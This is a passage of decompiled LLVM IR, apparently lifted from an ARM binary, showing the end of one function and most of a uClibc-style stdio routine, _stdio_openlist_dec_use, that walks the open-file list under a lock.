dec_label_pc_177fc:                               ; preds = %dec_label_pc_17788, %dec_label_pc_1776c, %dec_label_pc_177e4, %dec_label_pc_177dc
  %v0_177fc = load i32, i32* %r8.global-to-local, align 4
  %v2_17800 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_17800, i32* %r4.global-to-local, align 4
  store i32 %v6_176ec, i32* @r5, align 4
  store i32 %v9_176ec, i32* @r6, align 4
  store i32 %v12_176ec, i32* @r7, align 4
  store i32 %v15_176ec, i32* @r8, align 4
  store i32 %v24_176ec, i32* @lr, align 4
  ret i32 %v0_177fc

; uselistorder directives
  uselistorder i32 %v0_177d0, { 1, 0, 2 }
  uselistorder i32 %v1_177b4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_17770, { 1, 0 }
  uselistorder i32 %v0_17774, { 1, 0 }
  uselistorder i32 %v1_17730.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2, 5 }
  uselistorder label %dec_label_pc_177fc, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_177d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_177bc, { 1, 0 }
  uselistorder label %dec_label_pc_1776c, { 1, 0 }
  uselistorder label %dec_label_pc_17760, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_17750, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17738, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_17808 = load i32, i32* @r4, align 4
  store i32 %v3_17808, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r5.global-to-local, align 4
  %v4_17818 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 160) to i32*), align 4
  store i32 %v4_17818, i32* %r7.global-to-local, align 4
  %v0_1781c = call i32 @__aeabi_read_tp()
  store i32 %v0_1781c, i32* %r0.global-to-local, align 4
  %v1_17820 = add i32 %v4_17818, 8
  %v2_17820 = inttoptr i32 %v1_17820 to i32*
  %v3_17820 = load i32, i32* %v2_17820, align 4
  store i32 %v3_17820, i32* %r3.global-to-local, align 4
  %v1_17824 = add i32 %v0_1781c, -1168
  store i32 %v1_17824, i32* %r6.global-to-local, align 4
  %v3_17828 = icmp uge i32 %v3_17820, %v1_17824
  store i1 %v3_17828, i1* %cpsr_c.global-to-local, align 1
  %v9_17828 = icmp eq i32 %v3_17820, %v1_17824
  br i1 %v9_17828, label %dec_label_pc_17874, label %dec_label_pc_17834

dec_label_pc_17834:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1784093 = inttoptr i32 %v4_17818 to i32*
  %v2_1784094 = load i32, i32* %v1_1784093, align 4
  store i32 %v2_1784094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1784496 = icmp eq i32 %v2_1784094, 0
  br i1 %v9_1784496, label %dec_label_pc_1784c, label %dec_label_pc_17864

dec_label_pc_1784c:                               ; preds = %dec_label_pc_17834, %dec_label_pc_1784c.dec_label_pc_17840_crit_edge
  %v0_1784c97 = phi i32 [ %v1_17844.pre, %dec_label_pc_1784c.dec_label_pc_17840_crit_edge ], [ 0, %dec_label_pc_17834 ]
  store i32 %v0_1784c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1785c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1785c, label %dec_label_pc_17860, label %dec_label_pc_1784c.dec_label_pc_17840_crit_edge

dec_label_pc_1784c.dec_label_pc_17840_crit_edge:  ; preds = %dec_label_pc_1784c
  %v0_17840.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17844.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17840 = inttoptr i32 %v0_17840.pre to i32*
  %v2_17840 = load i32, i32* %v1_17840, align 4
  store i32 %v2_17840, i32* %r3.global-to-local, align 4
  %v3_17844 = icmp uge i32 %v2_17840, %v1_17844.pre
  store i1 %v3_17844, i1* %cpsr_c.global-to-local, align 1
  %v9_17844 = icmp eq i32 %v2_17840, %v1_17844.pre
  br i1 %v9_17844, label %dec_label_pc_1784c, label %dec_label_pc_17864

dec_label_pc_17860:                               ; preds = %dec_label_pc_1784c
  %v0_17860 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17860, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17864

dec_label_pc_17864:                               ; preds = %dec_label_pc_17834, %dec_label_pc_1784c.dec_label_pc_17840_crit_edge, %dec_label_pc_17860
  %v0_17864 = phi i32 [ %v0_17860, %dec_label_pc_17860 ], [ %v2_1784094, %dec_label_pc_17834 ], [ %v2_17840, %dec_label_pc_1784c.dec_label_pc_17840_crit_edge ]
  %v1_17864 = phi i32 [ %v0_17860, %dec_label_pc_17860 ], [ 0, %dec_label_pc_17834 ], [ %v1_17844.pre, %dec_label_pc_1784c.dec_label_pc_17840_crit_edge ]
  %v3_17864 = icmp uge i32 %v0_17864, %v1_17864
  store i1 %v3_17864, i1* %cpsr_c.global-to-local, align 1
  %v9_17864 = icmp eq i32 %v0_17864, %v1_17864
  br i1 %v9_17864, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_17864
  %v1_17868 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17868, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_17864, %bb
  %v1_1786c = xor i1 %v9_17864, true
  call void @__pseudo_cond_branch(i1 %v1_1786c, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_17870 = load i32, i32* %r6.global-to-local, align 4
  %v1_17870 = load i32, i32* %r7.global-to-local, align 4
  %v2_17870 = add i32 %v1_17870, 8
  %v3_17870 = inttoptr i32 %v2_17870 to i32*
  store i32 %v0_17870, i32* %v3_17870, align 4
  br label %dec_label_pc_17874

dec_label_pc_17874:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17878 = load i32, i32* %r5.global-to-local, align 4
  %v2_17878 = add i32 %v0_17878, 160
  %v3_17878 = inttoptr i32 %v2_17878 to i32*
  %v4_17878 = load i32, i32* %v3_17878, align 4
  store i32 %v4_17878, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_17880 = add i32 %v0_17878, 12
  %v3_17880 = inttoptr i32 %v2_17880 to i32*
  %v4_17880 = load i32, i32* %v3_17880, align 4
  store i32 %v4_17880, i32* %r3.global-to-local, align 4
  %v1_17884 = inttoptr i32 %v4_17880 to i32*
  %v2_17884 = load i32, i32* %v1_17884, align 4
  store i32 %v2_17884, i32* %r1.global-to-local, align 4
  %v1_17888 = add i32 %v4_17878, 4
  %v2_17888 = inttoptr i32 %v1_17888 to i32*
  %v3_17888 = load i32, i32* %v2_17888, align 4
  %v2_1788c = icmp ne i32 %v2_17884, 0
  store i1 %v2_1788c, i1* %cpsr_c.global-to-local, align 1
  %v7_1788c = icmp eq i32 %v2_17884, 1
  %v1_17890 = add i32 %v3_17888, 1
  store i32 %v1_17890, i32* %r3.global-to-local, align 4
  store i32 %v1_17890, i32* %v2_17888, align 4
  br i1 %v7_1788c, label %dec_label_pc_1789c, label %dec_label_pc_17a00

dec_label_pc_1789c:                               ; preds = %dec_label_pc_17874
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_178a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_178a0 = add i32 %v0_178a0, 80
  %v3_178a0 = inttoptr i32 %v2_178a0 to i32*
  %v4_178a0 = load i32, i32* %v3_178a0, align 4
  store i32 %v4_178a0, i32* %r3.global-to-local, align 4
  %v1_178a4 = inttoptr i32 %v4_178a0 to i32*
  %v2_178a4 = load i32, i32* %v1_178a4, align 4
  store i32 %v2_178a4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_178a4, 1
  br i1 %tmp46, label %dec_label_pc_17a00, label %dec_label_pc_178b0

dec_label_pc_178b0:                               ; preds = %dec_label_pc_1789c
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_178b4 = add i32 %v0_178a0, 152
  %v3_178b4 = inttoptr i32 %v2_178b4 to i32*
  %v4_178b4 = load i32, i32* %v3_178b4, align 4
  store i32 %v4_178b4, i32* %r7.global-to-local, align 4
  %v1_178b8 = add i32 %v4_178b4, 8
  %v2_178b8 = inttoptr i32 %v1_178b8 to i32*
  %v3_178b8 = load i32, i32* %v2_178b8, align 4
  store i32 %v3_178b8, i32* %r3.global-to-local, align 4
  %v1_178bc = load i32, i32* %r6.global-to-local, align 4
  %v3_178bc = icmp uge i32 %v3_178b8, %v1_178bc
  store i1 %v3_178bc, i1* %cpsr_c.global-to-local, align 1
  %v9_178bc = icmp eq i32 %v3_178b8, %v1_178bc
  br i1 %v9_178bc, label %dec_label_pc_17900, label %dec_label_pc_178c4

dec_label_pc_178c4:                               ; preds = %dec_label_pc_178b0
  store i32 %v4_178b4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_178cc86 = inttoptr i32 %v4_178b4 to i32*
  %v2_178cc87 = load i32, i32* %v1_178cc86, align 4
  store i32 %v2_178cc87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_178d089 = icmp eq i32 %v2_178cc87, 0
  br i1 %v9_178d089, label %dec_label_pc_178d8, label %dec_label_pc_178f0

dec_label_pc_178d8:                               ; preds = %dec_label_pc_178c4, %dec_label_pc_178d8.dec_label_pc_178cc_crit_edge
  %v0_178d890 = phi i32 [ %v1_178d0.pre, %dec_label_pc_178d8.dec_label_pc_178cc_crit_edge ], [ 0, %dec_label_pc_178c4 ]
  store i32 %v0_178d890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_178e8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_178e8, label %dec_label_pc_178ec, label %dec_label_pc_178d8.dec_label_pc_178cc_crit_edge

dec_label_pc_178d8.dec_label_pc_178cc_crit_edge:  ; preds = %dec_label_pc_178d8
  %v0_178cc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_178d0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_178cc = inttoptr i32 %v0_178cc.pre to i32*
  %v2_178cc = load i32, i32* %v1_178cc, align 4
  store i32 %v2_178cc, i32* %r3.global-to-local, align 4
  %v3_178d0 = icmp uge i32 %v2_178cc, %v1_178d0.pre
  store i1 %v3_178d0, i1* %cpsr_c.global-to-local, align 1
  %v9_178d0 = icmp eq i32 %v2_178cc, %v1_178d0.pre
  br i1 %v9_178d0, label %dec_label_pc_178d8, label %dec_label_pc_178f0

dec_label_pc_178ec:                               ; preds = %dec_label_pc_178d8
  %v0_178ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_178ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_178f0

dec_label_pc_178f0:                               ; preds = %dec_label_pc_178c4, %dec_label_pc_178d8.dec_label_pc_178cc_crit_edge, %dec_label_pc_178ec
  %v0_178f0 = phi i32 [ %v0_178ec, %dec_label_pc_178ec ], [ %v2_178cc87, %dec_label_pc_178c4 ], [ %v2_178cc, %dec_label_pc_178d8.dec_label_pc_178cc_crit_edge ]
  %v1_178f0 = phi i32 [ %v0_178ec, %dec_label_pc_178ec ], [ 0, %dec_label_pc_178c4 ], [ %v1_178d0.pre, %dec_label_pc_178d8.dec_label_pc_178cc_crit_edge ]
  %v3_178f0 = icmp uge i32 %v0_178f0, %v1_178f0
  store i1 %v3_178f0, i1* %cpsr_c.global-to-local, align 1
  %v9_178f0 = icmp eq i32 %v0_178f0, %v1_178f0
  br i1 %v9_178f0, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_178f0
  %v1_178f4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_178f4, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_178f0, %bb47
  %v1_178f8 = xor i1 %v9_178f0, true
  call void @__pseudo_cond_branch(i1 %v1_178f8, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_178fc = load i32, i32* %r6.global-to-local, align 4
  %v1_178fc = load i32, i32* %r7.global-to-local, align 4
  %v2_178fc = add i32 %v1_178fc, 8
  %v3_178fc = inttoptr i32 %v2_178fc to i32*
  store i32 %v0_178fc, i32* %v3_178fc, align 4
  %v0_17908.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17900

dec_label_pc_17900:                               ; preds = %dec_label_pc_178b0, %bb48
  %v0_17908 = phi i32 [ %v0_178a0, %dec_label_pc_178b0 ], [ %v0_17908.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_17908 = add i32 %v0_17908, 152
  %v3_17908 = inttoptr i32 %v2_17908 to i32*
  %v4_17908 = load i32, i32* %v3_17908, align 4
  store i32 %v4_17908, i32* %r0.global-to-local, align 4
  %v2_1790c = add i32 %v0_17908, 76
  %v3_1790c = inttoptr i32 %v2_1790c to i32*
  %v4_1790c = load i32, i32* %v3_1790c, align 4
  store i32 %v4_1790c, i32* %r2.global-to-local, align 4
  %v1_17910 = add i32 %v4_17908, 4
  %v2_17910 = inttoptr i32 %v1_17910 to i32*
  %v3_17910 = load i32, i32* %v2_17910, align 4
  store i32 %v3_17910, i32* %r3.global-to-local, align 4
  %v1_17914 = inttoptr i32 %v4_1790c to i32*
  %v2_17914 = load i32, i32* %v1_17914, align 4
  store i32 %v2_17914, i32* %r2.global-to-local, align 4
  %v1_17918 = add i32 %v3_17910, 1
  store i32 %v1_17918, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_17918, i32* %v2_17910, align 4
  %v0_17968.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1796811 = icmp eq i32 %v0_17968.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1796811, label %dec_label_pc_17974, label %dec_label_pc_1792c

dec_label_pc_1792c:                               ; preds = %dec_label_pc_17900, %dec_label_pc_17964
  %v0_179502 = phi i32 [ %v0_17964, %dec_label_pc_17964 ], [ %v0_17968.pr, %dec_label_pc_17900 ]
  %v1_1792c = inttoptr i32 %v0_179502 to i16*
  %v2_1792c = load i16, i16* %v1_1792c, align 2
  %v3_1792c = zext i16 %v2_1792c to i32
  store i32 %v3_1792c, i32* %r3.global-to-local, align 4
  %v2_17930 = and i32 %v3_1792c, 32816
  store i32 %v2_17930, i32* %r1.global-to-local, align 4
  %v2_17934 = icmp ugt i32 %v2_17930, 47
  store i1 %v2_17934, i1* %cpsr_c.global-to-local, align 1
  %v7_17934 = icmp eq i32 %v2_17930, 48
  %v1_17938 = add i32 %v0_179502, 32
  %v2_17938 = inttoptr i32 %v1_17938 to i32*
  %v3_17938 = load i32, i32* %v2_17938, align 4
  store i32 %v3_17938, i32* %r4.global-to-local, align 4
  br i1 %v7_17934, label %dec_label_pc_17944, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1792c
  store i32 %v0_179502, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17964

dec_label_pc_17944:                               ; preds = %dec_label_pc_1792c
  %v0_17944 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17944 = icmp eq i32 %v0_17944, 0
  br i1 %v2_17944, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_17944
  %v1_17948 = load i32, i32* %r5.global-to-local, align 4
  %v2_17948 = load i32, i32* %r7.global-to-local, align 4
  %v3_17948 = add i32 %v2_17948, %v1_17948
  %v4_17948 = inttoptr i32 %v3_17948 to i32*
  %v5_17948 = load i32, i32* %v4_17948, align 4
  store i32 %v5_17948, i32* %r3.global-to-local, align 4
  %v3_1794c = inttoptr i32 %v5_17948 to i32*
  store i32 %v3_17938, i32* %v3_1794c, align 4
  %v0_17950 = load i32, i32* %r2.global-to-local, align 4
  %v1_17950 = inttoptr i32 %v0_17950 to i16*
  %v2_17950 = load i16, i16* %v1_17950, align 2
  %v3_17950 = zext i16 %v2_17950 to i32
  store i32 %v3_17950, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_17944
  %v2_179508 = load i16, i16* %v1_1792c, align 2
  %v3_179509 = zext i16 %v2_179508 to i32
  store i32 %v3_179509, i32* %r3.global-to-local, align 4
  %v3_17954 = add i32 %v0_17944, 32
  %v4_17954 = inttoptr i32 %v3_17954 to i32*
  store i32 %v3_17938, i32* %v4_17954, align 4
  %v0_17958.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_17958 = phi i32 [ %v3_17950, %.thread ], [ %v0_17958.pre, %bb49 ]
  %v1_17958 = and i32 %v0_17958, 8192
  %v2_17958 = icmp eq i32 %v1_17958, 0
  br i1 %v2_17958, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_1795c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1795c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_17960 = xor i1 %v2_17958, true
  call void @__pseudo_cond_branch(i1 %v1_17960, i32 ptrtoint (i32* @global_var_1446c.63 to i32))
  %v0_17964.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17964

dec_label_pc_17964:                               ; preds = %.thread38, %bb52
  %v0_17964 = phi i32 [ %v0_17964.pre, %bb52 ], [ %v3_17938, %.thread38 ]
  store i32 %v0_17964, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17968 = icmp eq i32 %v0_17964, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_17968, label %dec_label_pc_17974, label %dec_label_pc_1792c

dec_label_pc_17974:                               ; preds = %dec_label_pc_17964, %dec_label_pc_17900
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17978 = load i32, i32* %r5.global-to-local, align 4
  %v2_17978 = add i32 %v0_17978, 152
  %v3_17978 = inttoptr i32 %v2_17978 to i32*
  %v4_17978 = load i32, i32* %v3_17978, align 4
  store i32 %v4_17978, i32* %r0.global-to-local, align 4
  %v1_1797c = add i32 %v4_17978, 4
  %v2_1797c = inttoptr i32 %v1_1797c to i32*
  %v3_1797c = load i32, i32* %v2_1797c, align 4
  %v1_17980 = add i32 %v3_1797c, -1
  store i32 %v1_17980, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17984 = icmp eq i32 %v1_17980, 0
  store i32 %v1_17980, i32* %v2_1797c, align 4
  br i1 %v2_17984, label %dec_label_pc_17990, label %dec_label_pc_179f0

dec_label_pc_17990:                               ; preds = %dec_label_pc_17974
  %v0_17990 = load i32, i32* %r3.global-to-local, align 4
  %v1_17990 = load i32, i32* %r0.global-to-local, align 4
  %v2_17990 = add i32 %v1_17990, 8
  %v3_17990 = inttoptr i32 %v2_17990 to i32*
  store i32 %v0_17990, i32* %v3_17990, align 4
  %v0_17994 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17994, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17998

dec_label_pc_17998:                               ; preds = %dec_label_pc_179c8.dec_label_pc_17998_crit_edge, %dec_label_pc_17990
  %v0_17998 = phi i32 [ %v0_17998.pre, %dec_label_pc_179c8.dec_label_pc_17998_crit_edge ], [ %v0_17994, %dec_label_pc_17990 ]
  %v1_17998 = inttoptr i32 %v0_17998 to i32*
  %v2_17998 = load i32, i32* %v1_17998, align 4
  store i32 %v2_17998, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17998, i32* %r2.global-to-local, align 4
  %v2_179a474 = load i32, i32* %v1_17998, align 4
  store i32 %v2_179a474, i32* %r3.global-to-local, align 4
  %v3_179a876 = icmp uge i32 %v2_179a474, %v2_17998
  store i1 %v3_179a876, i1* %cpsr_c.global-to-local, align 1
  %v9_179a882 = icmp eq i32 %v2_179a474, %v2_17998
  br i1 %v9_179a882, label %dec_label_pc_179b0, label %dec_label_pc_179c8

dec_label_pc_179b0:                               ; preds = %dec_label_pc_17998, %dec_label_pc_179b0.dec_label_pc_179a4_crit_edge
  %v0_179b083 = phi i32 [ %v1_179a8.pre, %dec_label_pc_179b0.dec_label_pc_179a4_crit_edge ], [ %v2_17998, %dec_label_pc_17998 ]
  store i32 %v0_179b083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_179c0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_179c0, label %dec_label_pc_179c4, label %dec_label_pc_179b0.dec_label_pc_179a4_crit_edge

dec_label_pc_179b0.dec_label_pc_179a4_crit_edge:  ; preds = %dec_label_pc_179b0
  %v0_179a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_179a8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_179a4 = inttoptr i32 %v0_179a4.pre to i32*
  %v2_179a4 = load i32, i32* %v1_179a4, align 4
  store i32 %v2_179a4, i32* %r3.global-to-local, align 4
  %v3_179a8 = icmp uge i32 %v2_179a4, %v1_179a8.pre
  store i1 %v3_179a8, i1* %cpsr_c.global-to-local, align 1
  %v9_179a8 = icmp eq i32 %v2_179a4, %v1_179a8.pre
  br i1 %v9_179a8, label %dec_label_pc_179b0, label %dec_label_pc_179c8

dec_label_pc_179c4:                               ; preds = %dec_label_pc_179b0
  %v0_179c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_179c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_179c8

dec_label_pc_179c8:                               ; preds = %dec_label_pc_17998, %dec_label_pc_179b0.dec_label_pc_179a4_crit_edge, %dec_label_pc_179c4
  %v0_179d0 = phi i32 [ %v0_179c4, %dec_label_pc_179c4 ], [ %v2_179a474, %dec_label_pc_17998 ], [ %v2_179a4, %dec_label_pc_179b0.dec_label_pc_179a4_crit_edge ]
  %v1_179c8 = phi i32 [ %v0_179c4, %dec_label_pc_179c4 ], [ %v2_17998, %dec_label_pc_17998 ], [ %v1_179a8.pre, %dec_label_pc_179b0.dec_label_pc_179a4_crit_edge ]
  %v3_179c8 = icmp uge i32 %v0_179d0, %v1_179c8
  store i1 %v3_179c8, i1* %cpsr_c.global-to-local, align 1
  %v9_179c8 = icmp eq i32 %v0_179d0, %v1_179c8
  br i1 %v9_179c8, label %dec_label_pc_179d0, label %dec_label_pc_179c8.dec_label_pc_17998_crit_edge

dec_label_pc_179c8.dec_label_pc_17998_crit_edge:  ; preds = %dec_label_pc_179c8
  %v0_17998.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17998

dec_label_pc_179d0:                               ; preds = %dec_label_pc_179c8
  %v2_179d0 = icmp ne i32 %v1_179c8, 0
  store i1 %v2_179d0, i1* %cpsr_c.global-to-local, align 1
  %v7_179d4 = icmp slt i32 %v1_179c8, 2
  br i1 %v7_179d4, label %dec_label_pc_179f0, label %dec_label_pc_179d8

dec_label_pc_179d8:                               ; preds = %dec_label_pc_179d0
  %v0_179d8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_179d8, i32* %r0.global-to-local, align 4
  %v0_179dc = load i32, i32* %r1.global-to-local, align 4
  %v1_179dc = add i32 %v0_179dc, 129
  store i32 %v1_179dc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_179f0

dec_label_pc_179f0:                               ; preds = %dec_label_pc_17974, %dec_label_pc_179d8, %dec_label_pc_179d0
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_179f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_179f4 = add i32 %v0_179f4, 80
  %v3_179f4 = inttoptr i32 %v2_179f4 to i32*
  %v4_179f4 = load i32, i32* %v3_179f4, align 4
  store i32 %v4_179f4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_179fc = inttoptr i32 %v4_179f4 to i32*
  store i32 0, i32* %v2_179fc, align 4
  br label %dec_label_pc_17a00

dec_label_pc_17a00:                               ; preds = %dec_label_pc_17874, %dec_label_pc_1789c, %dec_label_pc_179f0
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17a04 = load i32, i32* %r5.global-to-local, align 4
  %v2_17a04 = add i32 %v0_17a04, 160
  %v3_17a04 = inttoptr i32 %v2_17a04 to i32*
  %v4_17a04 = load i32, i32* %v3_17a04, align 4
  store i32 %v4_17a04, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_17a0c = add i32 %v0_17a04, 12
  %v3_17a0c = inttoptr i32 %v2_17a0c to i32*
  %v4_17a0c = load i32, i32* %v3_17a0c, align 4
  store i32 %v4_17a0c, i32* %r1.global-to-local, align 4
  %v1_17a10 = add i32 %v4_17a04, 4
  %v2_17a10 = inttoptr i32 %v1_17a10 to i32*
  %v3_17a10 = load i32, i32* %v2_17a10, align 4
  store i32 %v3_17a10, i32* %r2.global-to-local, align 4
  %v1_17a14 = inttoptr i32 %v4_17a0c to i32*
  %v2_17a14 = load i32, i32* %v1_17a14, align 4
  %v1_17a18 = add i32 %v3_17a10, -1
  store i32 %v1_17a18, i32* %r2.global-to-local, align 4
  %v1_17a1c = add i32 %v2_17a14, -1
  store i32 %v1_17a1c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17a20 = icmp eq i32 %v1_17a18, 0
  store i32 %v1_17a1c, i32* %v1_17a14, align 4
  %v0_17a28 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a28 = load i32, i32* %r0.global-to-local, align 4
  %v2_17a28 = add i32 %v1_17a28, 4
  %v3_17a28 = inttoptr i32 %v2_17a28 to i32*
  store i32 %v0_17a28, i32* %v3_17a28, align 4
  br i1 %v2_17a20, label %dec_label_pc_17a30, label %dec_label_pc_17a90

dec_label_pc_17a30:                               ; preds = %dec_label_pc_17a00
  %v0_17a30 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a30 = load i32, i32* %r0.global-to-local, align 4
  %v2_17a30 = add i32 %v1_17a30, 8
  %v3_17a30 = inttoptr i32 %v2_17a30 to i32*
  store i32 %v0_17a30, i32* %v3_17a30, align 4
  %v0_17a34 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17a34, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17a38

dec_label_pc_17a38:                               ; preds = %dec_label_pc_17a68.dec_label_pc_17a38_crit_edge, %dec_label_pc_17a30
  %v0_17a38 = phi i32 [ %v0_17a38.pre, %dec_label_pc_17a68.dec_label_pc_17a38_crit_edge ], [ %v0_17a34, %dec_label_pc_17a30 ]
  %v1_17a38 = inttoptr i32 %v0_17a38 to i32*
  %v2_17a38 = load i32, i32* %v1_17a38, align 4
  store i32 %v2_17a38, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17a38, i32* %r2.global-to-local, align 4
  %v2_17a4462 = load i32, i32* %v1_17a38, align 4
  store i32 %v2_17a4462, i32* %r3.global-to-local, align 4
  %v3_17a4864 = icmp uge i32 %v2_17a4462, %v2_17a38
  store i1 %v3_17a4864, i1* %cpsr_c.global-to-local, align 1
  %v9_17a4870 = icmp eq i32 %v2_17a4462, %v2_17a38
  br i1 %v9_17a4870, label %dec_label_pc_17a50, label %dec_label_pc_17a68

dec_label_pc_17a50:                               ; preds = %dec_label_pc_17a38, %dec_label_pc_17a50.dec_label_pc_17a44_crit_edge
  %v0_17a5071 = phi i32 [ %v1_17a48.pre, %dec_label_pc_17a50.dec_label_pc_17a44_crit_edge ], [ %v2_17a38, %dec_label_pc_17a38 ]
  store i32 %v0_17a5071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17a60 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17a60, label %dec_label_pc_17a64, label %dec_label_pc_17a50.dec_label_pc_17a44_crit_edge

